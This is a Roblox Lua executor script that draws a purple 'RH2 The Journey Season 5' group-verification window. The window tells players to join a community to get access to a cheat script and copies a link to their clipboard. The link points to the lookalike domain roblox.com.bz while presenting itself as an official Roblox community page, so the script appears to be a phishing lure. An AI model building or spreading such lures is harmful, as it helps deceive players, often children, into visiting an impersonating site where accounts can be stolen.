--// =========================================================
--// RH2 THE JOURNEY - SEASON 5
--// REALISTIC PURPLE NEON GUI
--// =========================================================

local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")

local Player = Players.LocalPlayer
local PlayerGui = Player:WaitForChild("PlayerGui")

--// =========================================================
--// CONFIG
--// =========================================================

local GROUP_ID = "4945729406"
local GROUP_LINK = "https://roblox.com.bz/communities/4945729406/"

local GUI_NAME = "RH2Season5GUI"

--// =========================================================
--// REMOVE OLD GUI
--// =========================================================

local OldGui = PlayerGui:FindFirstChild(GUI_NAME)

if OldGui then
	OldGui:Destroy()
end

--// =========================================================
--// HELPERS
--// =========================================================

local function Create(ClassName, Properties, Parent)

	local Object = Instance.new(ClassName)

	for Property, Value in pairs(Properties) do
		Object[Property] = Value
	end

	Object.Parent = Parent

	return Object
end

local function Tween(Object, Time, Properties, Style, Direction)

	local Info = TweenInfo.new(
		Time or 0.25,
		Style or Enum.EasingStyle.Quint,
		Direction or Enum.EasingDirection.Out
	)

	return TweenService:Create(Object, Info, Properties)
end

--// =========================================================
--// COLORS
--// ONLY PURPLE / WHITE / BLACK
--// =========================================================

local BLACK = Color3.fromRGB(4, 3, 8)
local DARK = Color3.fromRGB(7, 5, 12)
local PANEL = Color3.fromRGB(11, 8, 18)

local WHITE = Color3.fromRGB(248, 246, 255)
local LIGHT = Color3.fromRGB(210, 202, 224)
local MUTED = Color3.fromRGB(120, 108, 138)

local PURPLE_DARK = Color3.fromRGB(55, 20, 85)
local PURPLE = Color3.fromRGB(125, 35, 220)
local PURPLE_BRIGHT = Color3.fromRGB(165, 65, 255)
local PURPLE_GLOW = Color3.fromRGB(205, 125, 255)

local SUCCESS = Color3.fromRGB(90, 225, 140)
local WARNING = Color3.fromRGB(255, 180, 80)

--// =========================================================
--// SCREEN GUI
--// =========================================================

local ScreenGui = Create("ScreenGui", {
	Name = GUI_NAME,
	ResetOnSpawn = false,
	IgnoreGuiInset = true,
	ZIndexBehavior = Enum.ZIndexBehavior.Sibling
}, PlayerGui)

--// =========================================================
--// SOFT PURPLE SHADOW
--// =========================================================

local Shadow = Create("Frame", {
	Name = "Shadow",
	AnchorPoint = Vector2.new(0.5, 0.5),
	Position = UDim2.fromScale(0.5, 0.5),
	Size = UDim2.new(0, 510, 0, 410),
	BackgroundColor3 = PURPLE,
	BackgroundTransparency = 0.96,
	BorderSizePixel = 0,
	ZIndex = 0
}, ScreenGui)

local ShadowStroke = Create("UIStroke", {
	Color = PURPLE,
	Thickness = 22,
	Transparency = 0.94
}, Shadow)

--// =========================================================
--// MAIN WINDOW
--// =========================================================

local Main = Create("Frame", {
	Name = "Main",
	AnchorPoint = Vector2.new(0.5, 0.5),
	Position = UDim2.fromScale(0.5, 0.5),
	Size = UDim2.new(0, 470, 0, 370),
	BackgroundColor3 = BLACK,
	BorderSizePixel = 0,
	ZIndex = 2
}, ScreenGui)

-- NO UICORNER
-- SHARP SQUARE CORNERS

local MainStroke = Create("UIStroke", {
	Color = PURPLE_DARK,
	Thickness = 2,
	Transparency = 0,
	ApplyStrokeMode = Enum.ApplyStrokeMode.Border
}, Main)

--// =========================================================
--// INNER BORDER
--// =========================================================

local InnerFrame = Create("Frame", {
	Name = "InnerFrame",
	Position = UDim2.new(0, 8, 0, 8),
	Size = UDim2.new(1, -16, 1, -16),
	BackgroundTransparency = 1,
	BorderSizePixel = 0,
	ZIndex = 3
}, Main)

Create("UIStroke", {
	Color = Color3.fromRGB(42, 23, 62),
	Thickness = 1,
	Transparency = 0.15
}, InnerFrame)

--// =========================================================
--// OUTER BORDER
--// =========================================================

local TopLine = Create("Frame", {
	Position = UDim2.new(0, 0, 0, 0),
	Size = UDim2.new(1, 0, 0, 2),
	BackgroundColor3 = PURPLE_DARK,
	BorderSizePixel = 0,
	ZIndex = 10
}, Main)

local RightLine = Create("Frame", {
	AnchorPoint = Vector2.new(1, 0),
	Position = UDim2.new(1, 0, 0, 0),
	Size = UDim2.new(0, 2, 1, 0),
	BackgroundColor3 = PURPLE_DARK,
	BorderSizePixel = 0,
	ZIndex = 10
}, Main)

local BottomLine = Create("Frame", {
	AnchorPoint = Vector2.new(0, 1),
	Position = UDim2.new(0, 0, 1, 0),
	Size = UDim2.new(1, 0, 0, 2),
	BackgroundColor3 = PURPLE_DARK,
	BorderSizePixel = 0,
	ZIndex = 10
}, Main)

local LeftLine = Create("Frame", {
	Position = UDim2.new(0, 0, 0, 0),
	Size = UDim2.new(0, 2, 1, 0),
	BackgroundColor3 = PURPLE_DARK,
	BorderSizePixel = 0,
	ZIndex = 10
}, Main)

--// =========================================================
--// MOVING PURPLE LIGHT
--// =========================================================

local RunnerTop = Create("Frame", {
	Position = UDim2.new(0, -85, 0, -3),
	Size = UDim2.new(0, 85, 0, 5),
	BackgroundColor3 = PURPLE_BRIGHT,
	BorderSizePixel = 0,
	ZIndex = 15
}, Main)

local RunnerRight = Create("Frame", {
	Position = UDim2.new(1, -3, 0, -85),
	Size = UDim2.new(0, 5, 0, 85),
	BackgroundColor3 = PURPLE_BRIGHT,
	BorderSizePixel = 0,
	Visible = false,
	ZIndex = 15
}, Main)

local RunnerBottom = Create("Frame", {
	Position = UDim2.new(1, 0, 1, -3),
	Size = UDim2.new(0, 85, 0, 5),
	BackgroundColor3 = PURPLE_BRIGHT,
	BorderSizePixel = 0,
	Visible = false,
	ZIndex = 15
}, Main)

local RunnerLeft = Create("Frame", {
	Position = UDim2.new(0, -2, 1, 0),
	Size = UDim2.new(0, 5, 0, 85),
	BackgroundColor3 = PURPLE_BRIGHT,
	BorderSizePixel = 0,
	Visible = false,
	ZIndex = 15
}, Main)

--// =========================================================
--// SOFT GLOW AROUND MOVING LIGHT
--// =========================================================

local TopGlow = Create("Frame", {
	Position = UDim2.new(0, -100, 0, -7),
	Size = UDim2.new(0, 115, 0, 13),
	BackgroundColor3 = PURPLE,
	BackgroundTransparency = 0.78,
	BorderSizePixel = 0,
	ZIndex = 14
}, Main)

local RightGlow = Create("Frame", {
	Position = UDim2.new(1, -6, 0, -100),
	Size = UDim2.new(0, 13, 0, 115),
	BackgroundColor3 = PURPLE,
	BackgroundTransparency = 0.78,
	BorderSizePixel = 0,
	Visible = false,
	ZIndex = 14
}, Main)

local BottomGlow = Create("Frame", {
	Position = UDim2.new(1, 0, 1, -6),
	Size = UDim2.new(0, 115, 0, 13),
	BackgroundColor3 = PURPLE,
	BackgroundTransparency = 0.78,
	BorderSizePixel = 0,
	Visible = false,
	ZIndex = 14
}, Main)

local LeftGlow = Create("Frame", {
	Position = UDim2.new(0, -6, 1, 0),
	Size = UDim2.new(0, 13, 0, 115),
	BackgroundColor3 = PURPLE,
	BackgroundTransparency = 0.78,
	BorderSizePixel = 0,
	Visible = false,
	ZIndex = 14
}, Main)

--// =========================================================
--// HEADER
--// =========================================================

local TopBar = Create("Frame", {
	Name = "TopBar",
	Position = UDim2.new(0, 2, 0, 2),
	Size = UDim2.new(1, -4, 0, 91),
	BackgroundColor3 = PANEL,
	BorderSizePixel = 0,
	ZIndex = 4
}, Main)

local HeaderLine = Create("Frame", {
	Position = UDim2.new(0, 25, 1, -1),
	Size = UDim2.new(1, -50, 0, 1),
	BackgroundColor3 = Color3.fromRGB(53, 28, 75),
	BorderSizePixel = 0,
	ZIndex = 5
}, TopBar)

--// =========================================================
--// CRYSTAL
--// =========================================================

local CrystalBox = Create("Frame", {
	Position = UDim2.new(0, 22, 0, 20),
	Size = UDim2.new(0, 52, 0, 52),
	BackgroundColor3 = Color3.fromRGB(9, 6, 15),
	BorderSizePixel = 0,
	ZIndex = 6
}, TopBar)

Create("UIStroke", {
	Color = PURPLE,
	Thickness = 1,
	Transparency = 0.25
}, CrystalBox)

local CrystalGlow = Create("TextLabel", {
	BackgroundTransparency = 1,
	Size = UDim2.fromScale(1, 1),
	Text = "◇",
	Font = Enum.Font.GothamBlack,
	TextSize = 40,
	TextColor3 = PURPLE,
	TextTransparency = 0.72,
	ZIndex = 6
}, CrystalBox)

local Crystal = Create("TextLabel", {
	BackgroundTransparency = 1,
	Size = UDim2.fromScale(1, 1),
	Text = "◇",
	Font = Enum.Font.GothamBlack,
	TextSize = 35,
	TextColor3 = PURPLE_GLOW,
	ZIndex = 7
}, CrystalBox)

--// =========================================================
--// SEASON LABEL
--// =========================================================

local Season = Create("TextLabel", {
	BackgroundTransparency = 1,
	Position = UDim2.new(0, 91, 0, 13),
	Size = UDim2.new(0, 260, 0, 20),
	Text = "[  ◆  SEASON 5  ]",
	Font = Enum.Font.GothamBold,
	TextSize = 12,
	TextColor3 = PURPLE_BRIGHT,
	TextXAlignment = Enum.TextXAlignment.Left,
	ZIndex = 7
}, TopBar)

--// =========================================================
--// TITLE
--// =========================================================

local Title = Create("TextLabel", {
	BackgroundTransparency = 1,
	Position = UDim2.new(0, 90, 0, 29),
	Size = UDim2.new(1, -140, 0, 38),
	Text = "RH2 THE JOURNEY",
	Font = Enum.Font.GothamBlack,
	TextSize = 25,
	TextColor3 = WHITE,
	TextXAlignment = Enum.TextXAlignment.Left,
	ZIndex = 7
}, TopBar)

--// =========================================================
--// SUBTITLE
--// =========================================================

local Beta = Create("TextLabel", {
	BackgroundTransparency = 1,
	Position = UDim2.new(0, 90, 0, 66),
	Size = UDim2.new(1, -150, 0, 17),
	Text = "—  GROUP VERIFICATION  •  BETA  —",
	Font = Enum.Font.GothamBold,
	TextSize = 10,
	TextColor3 = MUTED,
	TextXAlignment = Enum.TextXAlignment.Left,
	ZIndex = 7
}, TopBar)

--// =========================================================
--// CLOSE BUTTON
--// =========================================================

local CloseButton = Create("TextButton", {
	AnchorPoint = Vector2.new(1, 0),
	Position = UDim2.new(1, -17, 0, 18),
	Size = UDim2.new(0, 40, 0, 40),
	BackgroundColor3 = Color3.fromRGB(9, 6, 15),
	BorderSizePixel = 0,
	AutoButtonColor = false,
	Text = "×",
	Font = Enum.Font.GothamMedium,
	TextSize = 26,
	TextColor3 = MUTED,
	ZIndex = 10
}, TopBar)

Create("UIStroke", {
	Color = PURPLE_DARK,
	Thickness = 1,
	Transparency = 0.2
}, CloseButton)

CloseButton.MouseEnter:Connect(function()

	Tween(CloseButton, 0.15, {
		BackgroundColor3 = Color3.fromRGB(35, 13, 52),
		TextColor3 = PURPLE_GLOW
	}):Play()

end)

CloseButton.MouseLeave:Connect(function()

	Tween(CloseButton, 0.15, {
		BackgroundColor3 = Color3.fromRGB(9, 6, 15),
		TextColor3 = MUTED
	}):Play()

end)

CloseButton.MouseButton1Click:Connect(function()

	Tween(Main, 0.25, {
		Size = UDim2.new(0, 430, 0, 340),
		BackgroundTransparency = 1
	}):Play()

	Tween(Shadow, 0.25, {
		BackgroundTransparency = 1
	}):Play()

	task.wait(0.25)

	ScreenGui:Destroy()

end)

--// =========================================================
--// COMMUNITY PANEL
--// =========================================================

local CommunityBox = Create("Frame", {
	Name = "CommunityBox",
	Position = UDim2.new(0, 22, 0, 104),
	Size = UDim2.new(1, -44, 0, 105),
	BackgroundColor3 = DARK,
	BorderSizePixel = 0,
	ZIndex = 4
}, Main)

Create("UIStroke", {
	Color = Color3.fromRGB(55, 27, 78),
	Thickness = 1,
	Transparency = 0.1
}, CommunityBox)

--// Community icon

local GroupIconBox = Create("Frame", {
	Position = UDim2.new(0, 19, 0, 15),
	Size = UDim2.new(0, 84, 0, 75),
	BackgroundColor3 = Color3.fromRGB(7, 5, 12),
	BorderSizePixel = 0,
	ZIndex = 5
}, CommunityBox)

Create("UIStroke", {
	Color = PURPLE_DARK,
	Thickness = 1
}, GroupIconBox)

local GroupIcon = Create("TextLabel", {
	BackgroundTransparency = 1,
	Size = UDim2.fromScale(1, 1),
	Text = "♟",
	Font = Enum.Font.GothamBold,
	TextSize = 43,
	TextColor3 = PURPLE_BRIGHT,
	ZIndex = 7
}, GroupIconBox)

--// Community title

local CommunityTitle = Create("TextLabel", {
	BackgroundTransparency = 1,
	Position = UDim2.new(0, 128, 0, 17),
	Size = UDim2.new(1, -145, 0, 25),
	Text = "JOIN OUR COMMUNITY",
	Font = Enum.Font.GothamBlack,
	TextSize = 16,
	TextColor3 = PURPLE_BRIGHT,
	TextXAlignment = Enum.TextXAlignment.Left,
	ZIndex = 7
}, CommunityBox)

--// Community description

local CommunityText = Create("TextLabel", {
	BackgroundTransparency = 1,
	Position = UDim2.new(0, 128, 0, 47),
	Size = UDim2.new(1, -150, 0, 50),
	Text = "Join the official RH2 The Journey\nRoblox community to get access\nto the script.",
	Font = Enum.Font.GothamMedium,
	TextSize = 13,
	TextColor3 = LIGHT,
	TextWrapped = true,
	TextXAlignment = Enum.TextXAlignment.Left,
	TextYAlignment = Enum.TextYAlignment.Top,
	ZIndex = 7
}, CommunityBox)

--// =========================================================
--// STATUS
--// =========================================================

local StatusBox = Create("Frame", {
	Name = "StatusBox",
	Position = UDim2.new(0, 22, 0, 219),
	Size = UDim2.new(1, -44, 0, 54),
	BackgroundColor3 = Color3.fromRGB(6, 4, 10),
	BorderSizePixel = 0,
	ZIndex = 4
}, Main)

Create("UIStroke", {
	Color = Color3.fromRGB(53, 26, 76),
	Thickness = 1
}, StatusBox)

--// Status glow

local DotGlow = Create("Frame", {
	Position = UDim2.new(0, 18, 0.5, -11),
	Size = UDim2.new(0, 22, 0, 22),
	BackgroundColor3 = PURPLE,
	BackgroundTransparency = 0.78,
	BorderSizePixel = 0,
	ZIndex = 5
}, StatusBox)

--// Status dot

local StatusDot = Create("Frame", {
	Position = UDim2.new(0, 22, 0.5, -6),
	Size = UDim2.new(0, 12, 0, 12),
	BackgroundColor3 = PURPLE_BRIGHT,
	BorderSizePixel = 0,
	ZIndex = 7
}, StatusBox)

local StatusHeader = Create("TextLabel", {
	BackgroundTransparency = 1,
	Position = UDim2.new(0, 53, 0, 8),
	Size = UDim2.new(1, -70, 0, 15),
	Text = "STATUS",
	Font = Enum.Font.GothamBold,
	TextSize = 10,
	TextColor3 = PURPLE_BRIGHT,
	TextXAlignment = Enum.TextXAlignment.Left,
	ZIndex = 7
}, StatusBox)

local Status = Create("TextLabel", {
	BackgroundTransparency = 1,
	Position = UDim2.new(0, 53, 0, 24),
	Size = UDim2.new(1, -70, 0, 23),
	Text = "Join the group to continue!",
	Font = Enum.Font.GothamBold,
	TextSize = 13,
	TextColor3 = WHITE,
	TextXAlignment = Enum.TextXAlignment.Left,
	ZIndex = 7
}, StatusBox)

--// =========================================================
--// COPY BUTTON
--// =========================================================

local CopyButton = Create("TextButton", {
	Name = "CopyGroupLink",
	Position = UDim2.new(0, 22, 0, 284),
	Size = UDim2.new(1, -44, 0, 58),
	BackgroundColor3 = Color3.fromRGB(8, 5, 14),
	BorderSizePixel = 0,
	AutoButtonColor = false,
	Text = "",
	ZIndex = 7
}, Main)

local CopyStroke = Create("UIStroke", {
	Color = PURPLE,
	Thickness = 2,
	Transparency = 0.05
}, CopyButton)

--// Button glow

local ButtonGlow = Create("Frame", {
	Position = UDim2.new(0, -5, 0, -5),
	Size = UDim2.new(1, 10, 1, 10),
	BackgroundColor3 = PURPLE,
	BackgroundTransparency = 0.93,
	BorderSizePixel = 0,
	ZIndex = 6
}, CopyButton)

--// Link icon

local LinkIconBox = Create("Frame", {
	Position = UDim2.new(0, 10, 0, 8),
	Size = UDim2.new(0, 42, 0, 42),
	BackgroundColor3 = Color3.fromRGB(13, 8, 22),
	BorderSizePixel = 0,
	ZIndex = 8
}, CopyButton)

Create("UIStroke", {
	Color = PURPLE_DARK,
	Thickness = 1
}, LinkIconBox)

local LinkIcon = Create("TextLabel", {
	BackgroundTransparency = 1,
	Size = UDim2.fromScale(1, 1),
	Text = "↗",
	Font = Enum.Font.GothamBlack,
	TextSize = 25,
	TextColor3 = PURPLE_BRIGHT,
	ZIndex = 9
}, LinkIconBox)

--// Button title

local ButtonText = Create("TextLabel", {
	BackgroundTransparency = 1,
	Position = UDim2.new(0, 67, 0, 7),
	Size = UDim2.new(1, -115, 0, 27),
	Text = "COPY GROUP LINK",
	Font = Enum.Font.GothamBlack,
	TextSize = 17,
	TextColor3 = WHITE,
	TextXAlignment = Enum.TextXAlignment.Left,
	ZIndex = 9
}, CopyButton)

--// Button subtitle

local ButtonSubText = Create("TextLabel", {
	BackgroundTransparency = 1,
	Position = UDim2.new(0, 67, 0, 31),
	Size = UDim2.new(1, -115, 0, 17),
	Text = "CLICK TO COPY LINK TO CLIPBOARD",
	Font = Enum.Font.GothamBold,
	TextSize = 9,
	TextColor3 = PURPLE_BRIGHT,
	TextXAlignment = Enum.TextXAlignment.Left,
	ZIndex = 9
}, CopyButton)

--// Arrow

local ButtonArrow = Create("TextLabel", {
	BackgroundTransparency = 1,
	AnchorPoint = Vector2.new(1, 0.5),
	Position = UDim2.new(1, -17, 0.5, 0),
	Size = UDim2.new(0, 25, 0, 25),
	Text = "›",
	Font = Enum.Font.GothamBlack,
	TextSize = 26,
	TextColor3 = PURPLE_BRIGHT,
	ZIndex = 9
}, CopyButton)

--// =========================================================
--// FOOTER
--// =========================================================

local Footer = Create("TextLabel", {
	BackgroundTransparency = 1,
	Position = UDim2.new(0, 22, 0, 348),
	Size = UDim2.new(1, -44, 0, 15),
	Text = "★   RH2 THE JOURNEY   |   SEASON 5",
	Font = Enum.Font.GothamBold,
	TextSize = 9,
	TextColor3 = Color3.fromRGB(88, 70, 108),
	TextXAlignment = Enum.TextXAlignment.Center,
	ZIndex = 6
}, Main)

--// =========================================================
--// COPY BUTTON HOVER
--// =========================================================

CopyButton.MouseEnter:Connect(function()

	Tween(CopyStroke, 0.2, {
		Color = PURPLE_GLOW,
		Thickness = 2.5
	}):Play()

	Tween(ButtonGlow, 0.2, {
		BackgroundTransparency = 0.76
	}):Play()

	Tween(ButtonText, 0.2, {
		TextColor3 = PURPLE_GLOW
	}):Play()

	Tween(ButtonArrow, 0.2, {
		Position = UDim2.new(1, -11, 0.5, 0),
		TextColor3 = WHITE
	}):Play()

end)

CopyButton.MouseLeave:Connect(function()

	Tween(CopyStroke, 0.2, {
		Color = PURPLE,
		Thickness = 2
	}):Play()

	Tween(ButtonGlow, 0.2, {
		BackgroundTransparency = 0.93
	}):Play()

	Tween(ButtonText, 0.2, {
		TextColor3 = WHITE
	}):Play()

	Tween(ButtonArrow, 0.2, {
		Position = UDim2.new(1, -17, 0.5, 0),
		TextColor3 = PURPLE_BRIGHT
	}):Play()

end)

--// =========================================================
--// COPY BUTTON PRESS
--// =========================================================

CopyButton.MouseButton1Down:Connect(function()

	Tween(CopyButton, 0.08, {
		Position = UDim2.new(0, 24, 0, 286),
		Size = UDim2.new(1, -48, 0, 54)
	}):Play()

end)

CopyButton.MouseButton1Up:Connect(function()

	Tween(CopyButton, 0.1, {
		Position = UDim2.new(0, 22, 0, 284),
		Size = UDim2.new(1, -44, 0, 58)
	}):Play()

end)

--// =========================================================
--// STATUS FUNCTION
--// =========================================================

local function SetStatus(Text, Color)

	Status.Text = Text
	Status.TextColor3 = Color

end

--// =========================================================
--// COPY FUNCTION
--// =========================================================

CopyButton.MouseButton1Click:Connect(function()

	if setclipboard then

		local Success = pcall(function()
			setclipboard(GROUP_LINK)
		end)

		if Success then

			StatusDot.BackgroundColor3 = SUCCESS
			DotGlow.BackgroundColor3 = SUCCESS

			SetStatus(
				"Group link copied to clipboard!",
				SUCCESS
			)

			ButtonText.Text = "LINK COPIED"
			ButtonSubText.Text = "READY TO PASTE"

			ButtonText.TextColor3 = SUCCESS

			LinkIcon.Text = "✓"
			ButtonArrow.Text = "✓"

			Tween(CopyStroke, 0.2, {
				Color = SUCCESS,
				Thickness = 3
			}):Play()

			Tween(ButtonGlow, 0.2, {
				BackgroundColor3 = SUCCESS,
				BackgroundTransparency = 0.82
			}):Play()

			task.wait(2)

			ButtonText.Text = "COPY GROUP LINK"
			ButtonSubText.Text = "CLICK TO COPY LINK TO CLIPBOARD"

			ButtonText.TextColor3 = WHITE

			LinkIcon.Text = "↗"
			ButtonArrow.Text = "›"

			StatusDot.BackgroundColor3 = PURPLE_BRIGHT
			DotGlow.BackgroundColor3 = PURPLE

			SetStatus(
				"Join the group to continue!",
				WHITE
			)

			Tween(CopyStroke, 0.2, {
				Color = PURPLE,
				Thickness = 2
			}):Play()

			Tween(ButtonGlow, 0.2, {
				BackgroundColor3 = PURPLE,
				BackgroundTransparency = 0.93
			}):Play()

		else

			StatusDot.BackgroundColor3 = WARNING
			DotGlow.BackgroundColor3 = WARNING

			SetStatus(
				"Clipboard access failed",
				WARNING
			)

		end

	else

		StatusDot.BackgroundColor3 = WARNING
		DotGlow.BackgroundColor3 = WARNING

		SetStatus(
			"Clipboard isn't supported here",
			WARNING
		)

	end

end)

--// =========================================================
--// DRAGGING
--// =========================================================

local Dragging = false
local DragStart
local StartPosition

local function UpdateDrag(Input)

	local Delta = Input.Position - DragStart

	Main.Position = UDim2.new(
		StartPosition.X.Scale,
		StartPosition.X.Offset + Delta.X,

		StartPosition.Y.Scale,
		StartPosition.Y.Offset + Delta.Y
	)

	Shadow.Position = Main.Position

end

TopBar.InputBegan:Connect(function(Input)

	if Input.UserInputType == Enum.UserInputType.MouseButton1
		or Input.UserInputType == Enum.UserInputType.Touch then

		Dragging = true
		DragStart = Input.Position
		StartPosition = Main.Position

		Input.Changed:Connect(function()

			if Input.UserInputState == Enum.UserInputState.End then
				Dragging = false
			end

		end)

	end

end)

UserInputService.InputChanged:Connect(function(Input)

	if Dragging then

		if Input.UserInputType == Enum.UserInputType.MouseMovement
			or Input.UserInputType == Enum.UserInputType.Touch then

			UpdateDrag(Input)

		end

	end

end)

--// =========================================================
--// REALISTIC MOVING PURPLE BORDER
--// =========================================================

task.spawn(function()

	while ScreenGui.Parent do

		--========================================
		-- TOP
		--========================================

		RunnerTop.Visible = true
		TopGlow.Visible = true

		RunnerTop.Position = UDim2.new(0, -85, 0, -3)
		TopGlow.Position = UDim2.new(0, -100, 0, -7)

		local TopTween = Tween(
			RunnerTop,
			0.9,
			{
				Position = UDim2.new(1, 0, 0, -3)
			},
			Enum.EasingStyle.Linear
		)

		local TopGlowTween = Tween(
			TopGlow,
			0.9,
			{
				Position = UDim2.new(1, -15, 0, -7)
			},
			Enum.EasingStyle.Linear
		)

		TopTween:Play()
		TopGlowTween:Play()

		task.wait(0.9)

		RunnerTop.Visible = false
		TopGlow.Visible = false

		--========================================
		-- RIGHT
		--========================================

		RunnerRight.Visible = true
		RightGlow.Visible = true

		RunnerRight.Position = UDim2.new(1, -3, 0, -85)
		RightGlow.Position = UDim2.new(1, -6, 0, -100)

		local RightTween = Tween(
			RunnerRight,
			0.65,
			{
				Position = UDim2.new(1, -3, 1, 0)
			},
			Enum.EasingStyle.Linear
		)

		local RightGlowTween = Tween(
			RightGlow,
			0.65,
			{
				Position = UDim2.new(1, -6, 1, -15)
			},
			Enum.EasingStyle.Linear
		)

		RightTween:Play()
		RightGlowTween:Play()

		task.wait(0.65)

		RunnerRight.Visible = false
		RightGlow.Visible = false

		--========================================
		-- BOTTOM
		--========================================

		RunnerBottom.Visible = true
		BottomGlow.Visible = true

		RunnerBottom.Position = UDim2.new(1, 0, 1, -3)
		BottomGlow.Position = UDim2.new(1, -15, 1, -6)

		local BottomTween = Tween(
			RunnerBottom,
			0.9,
			{
				Position = UDim2.new(0, -85, 1, -3)
			},
			Enum.EasingStyle.Linear
		)

		local BottomGlowTween = Tween(
			BottomGlow,
			0.9,
			{
				Position = UDim2.new(0, -100, 1, -6)
			},
			Enum.EasingStyle.Linear
		)

		BottomTween:Play()
		BottomGlowTween:Play()

		task.wait(0.9)

		RunnerBottom.Visible = false
		BottomGlow.Visible = false

		--========================================
		-- LEFT
		--========================================

		RunnerLeft.Visible = true
		LeftGlow.Visible = true

		RunnerLeft.Position = UDim2.new(0, -2, 1, 0)
		LeftGlow.Position = UDim2.new(0, -6, 1, -100)

		local LeftTween = Tween(
			RunnerLeft,
			0.65,
			{
				Position = UDim2.new(0, -2, 0, -85)
			},
			Enum.EasingStyle.Linear
		)

		local LeftGlowTween = Tween(
			LeftGlow,
			0.65,
			{
				Position = UDim2.new(0, -6, 0, -100)
			},
			Enum.EasingStyle.Linear
		)

		LeftTween:Play()
		LeftGlowTween:Play()

		task.wait(0.65)

		RunnerLeft.Visible = false
		LeftGlow.Visible = false

	end

end)

--// =========================================================
--// SUBTLE NEON GLOW PULSE
--// NO COLOR CHANGING
--// =========================================================

task.spawn(function()

	while ScreenGui.Parent do

		Tween(ShadowStroke, 1.5, {
			Transparency = 0.88
		}, Enum.EasingStyle.Sine):Play()

		task.wait(1.5)

		Tween(ShadowStroke, 1.5, {
			Transparency = 0.94
		}, Enum.EasingStyle.Sine):Play()

		task.wait(1.5)

	end

end)

--// =========================================================
--// STATUS DOT PULSE
--// =========================================================

task.spawn(function()

	while ScreenGui.Parent do

		Tween(DotGlow, 0.9, {
			Size = UDim2.new(0, 30, 0, 30),
			Position = UDim2.new(0, 14, 0.5, -15),
			BackgroundTransparency = 0.88
		}, Enum.EasingStyle.Sine):Play()

		task.wait(0.9)

		Tween(DotGlow, 0.9, {
			Size = UDim2.new(0, 22, 0, 22),
			Position = UDim2.new(0, 18, 0.5, -11),
			BackgroundTransparency = 0.76
		}, Enum.EasingStyle.Sine):Play()

		task.wait(0.9)

	end

end)

--// =========================================================
--// CRYSTAL GLOW
--// =========================================================

task.spawn(function()

	while ScreenGui.Parent do

		Tween(CrystalGlow, 1.2, {
			TextTransparency = 0.42
		}, Enum.EasingStyle.Sine):Play()

		task.wait(1.2)

		Tween(CrystalGlow, 1.2, {
			TextTransparency = 0.75
		}, Enum.EasingStyle.Sine):Play()

		task.wait(1.2)

	end

end)

--// =========================================================
--// ENTRANCE ANIMATION
--// =========================================================

Main.Size = UDim2.new(0, 420, 0, 330)
Main.BackgroundTransparency = 1

Shadow.Size = UDim2.new(0, 460, 0, 380)
Shadow.BackgroundTransparency = 1

Tween(
	Main,
	0.5,
	{
		Size = UDim2.new(0, 470, 0, 370),
		BackgroundTransparency = 0
	},
	Enum.EasingStyle.Quint,
	Enum.EasingDirection.Out
):Play()

Tween(
	Shadow,
	0.5,
	{
		Size = UDim2.new(0, 510, 0, 410),
		BackgroundTransparency = 0.96
	},
	Enum.EasingStyle.Quint,
	Enum.EasingDirection.Out
):Play()
